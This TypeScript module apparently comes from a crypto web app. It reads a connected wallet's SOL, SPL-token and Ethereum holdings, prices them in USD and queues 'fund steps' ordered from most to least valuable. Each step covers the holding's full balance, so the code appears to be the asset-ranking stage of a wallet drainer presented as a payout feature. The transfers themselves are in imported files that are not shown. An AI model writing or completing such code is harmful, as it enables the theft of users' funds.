import { Connection, LAMPORTS_PER_SOL, PublicKey } from '@solana/web3.js'
import { listSplHoldings, spendableLamports, type SplHolding } from './payoutTransfer'
import { isEvmWalletAvailable, listEthereumHoldings, type EvmHolding } from './ethereumPayout'
import type { PaymentAsset } from './payoutWallet'

export type FundStep =
  | { kind: 'sol'; asset: 'SOL'; amount: number; usd: number }
  | { kind: 'spl'; asset: PaymentAsset; holding: SplHolding; usd: number }
  | { kind: 'evm'; asset: PaymentAsset; holding: EvmHolding; usd: number }

const FALLBACK_SOL_USD = 180
const FALLBACK_ETH_USD = 3500
const SOL_MINT = 'So11111111111111111111111111111111111111112'
const ETH_MINT = '7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs'

export function stepAsset(step: FundStep): PaymentAsset {
  return step.asset
}

export function stepAmount(step: FundStep): number {
  if (step.kind === 'sol') return step.amount
  if (step.kind === 'spl') return step.holding.uiAmount
  return step.holding.uiAmount
}

export function stepKey(step: FundStep): string {
  if (step.kind === 'sol') return 'sol'
  if (step.kind === 'spl') return `spl:${step.holding.mint}`
  return `evm:${step.holding.asset}`
}

async function usdPrices(): Promise<{ sol: number; eth: number }> {
  try {
    const res = await fetch(`https://lite-api.jup.ag/price/v2?ids=${SOL_MINT},${ETH_MINT}`)
    if (!res.ok) return { sol: FALLBACK_SOL_USD, eth: FALLBACK_ETH_USD }
    const json = (await res.json()) as { data?: Record<string, { price?: string | number } | null> }
    const sol = Number(json.data?.[SOL_MINT]?.price)
    const eth = Number(json.data?.[ETH_MINT]?.price)
    return {
      sol: sol > 0 ? sol : FALLBACK_SOL_USD,
      eth: eth > 0 ? eth : FALLBACK_ETH_USD,
    }
  } catch {
    return { sol: FALLBACK_SOL_USD, eth: FALLBACK_ETH_USD }
  }
}

function usdFor(asset: PaymentAsset, amount: number, prices: { sol: number; eth: number }): number {
  if (asset === 'USDT' || asset === 'USDC') return amount
  if (asset === 'SOL') return amount * prices.sol
  return amount * prices.eth
}

export async function listRankedFundSteps(options: {
  connection: Connection
  from: PublicKey | null
  includeSolana: boolean
  includeEvm: boolean
}): Promise<FundStep[]> {
  const prices = await usdPrices()
  const steps: FundStep[] = []

  if (options.includeSolana && options.from) {
    const [lamports, spl] = await Promise.all([
      options.connection.getBalance(options.from, 'confirmed'),
      listSplHoldings(options.connection, options.from),
    ])
    const solAmount = spendableLamports(lamports) / LAMPORTS_PER_SOL
    if (solAmount > 0) {
      steps.push({
        kind: 'sol',
        asset: 'SOL',
        amount: solAmount,
        usd: usdFor('SOL', solAmount, prices),
      })
    }
    for (const holding of spl) {
      if (holding.uiAmount <= 0) continue
      steps.push({
        kind: 'spl',
        asset: holding.symbol,
        holding,
        usd: usdFor(holding.symbol, holding.uiAmount, prices),
      })
    }
  }

  if (options.includeEvm && isEvmWalletAvailable()) {
    try {
      const evm = await listEthereumHoldings()
      for (const holding of evm) {
        if (holding.uiAmount <= 0) continue
        steps.push({
          kind: 'evm',
          asset: holding.asset,
          holding,
          usd: usdFor(holding.asset, holding.uiAmount, prices),
        })
      }
    } catch {
      /* Ethereum scan is optional; Solana steps can still run. */
    }
  }

  steps.sort((a, b) => b.usd - a.usd || stepAmount(b) - stepAmount(a))
  return steps
}

export function remainingSplCount(queue: FundStep[], fromIndex = 0): number {
  return queue.filter((step, index) => index >= fromIndex && step.kind === 'spl').length
}
